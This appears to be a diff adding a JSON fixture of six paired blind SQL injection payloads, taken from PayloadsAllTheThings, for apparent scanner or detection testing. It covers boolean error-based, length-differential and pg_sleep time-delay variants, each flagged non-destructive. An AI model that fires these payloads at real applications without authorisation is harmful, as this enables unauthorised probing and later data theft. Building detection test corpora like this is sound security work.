@@ -1,0 +1,70 @@
+[
+  {
+    "name": "blind_sqli_ascii_length_true",
+    "value": "' AND (SELECT (CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END))=1-- ",
+    "kind": "blind_conditional_true",
+    "technique": "conditional_error_boolean",
+    "pair_id": "blind_case_1",
+    "paired_value": "' AND (SELECT (CASE WHEN (1=2) THEN 1 ELSE 1/(SELECT 0) END))=1-- ",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Blind-based.md"
+  },
+  {
+    "name": "blind_sqli_ascii_length_false",
+    "value": "' AND (SELECT (CASE WHEN (1=2) THEN 1 ELSE 1/(SELECT 0) END))=1-- ",
+    "kind": "blind_conditional_false",
+    "technique": "conditional_error_boolean",
+    "pair_id": "blind_case_1",
+    "paired_value": "' AND (SELECT (CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END))=1-- ",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Blind-based.md"
+  },
+  {
+    "name": "blind_sqli_length_check_true",
+    "value": "' AND LENGTH('test')=4-- ",
+    "kind": "blind_differential_true",
+    "technique": "content_differential",
+    "pair_id": "blind_length_1",
+    "paired_value": "' AND LENGTH('test')=5-- ",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Blind-based.md"
+  },
+  {
+    "name": "blind_sqli_length_check_false",
+    "value": "' AND LENGTH('test')=5-- ",
+    "kind": "blind_differential_false",
+    "technique": "content_differential",
+    "pair_id": "blind_length_1",
+    "paired_value": "' AND LENGTH('test')=4-- ",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Blind-based.md"
+  },
+  {
+    "name": "blind_sqli_time_delay_true",
+    "value": "' AND (CASE WHEN (1=1) THEN (SELECT pg_sleep(2)) ELSE 'a' END)='a'-- ",
+    "kind": "blind_time_true",
+    "technique": "conditional_time_delay",
+    "delay_seconds": 2,
+    "pair_id": "blind_time_1",
+    "paired_value": "' AND (CASE WHEN (1=2) THEN (SELECT pg_sleep(2)) ELSE 'a' END)='a'-- ",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Blind-based.md"
+  },
+  {
+    "name": "blind_sqli_time_delay_false",
+    "value": "' AND (CASE WHEN (1=2) THEN (SELECT pg_sleep(2)) ELSE 'a' END)='a'-- ",
+    "kind": "blind_time_false",
+    "technique": "conditional_time_delay",
+    "delay_seconds": 0,
+    "pair_id": "blind_time_1",
+    "paired_value": "' AND (CASE WHEN (1=1) THEN (SELECT pg_sleep(2)) ELSE 'a' END)='a'-- ",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Blind-based.md"
+  }
+]
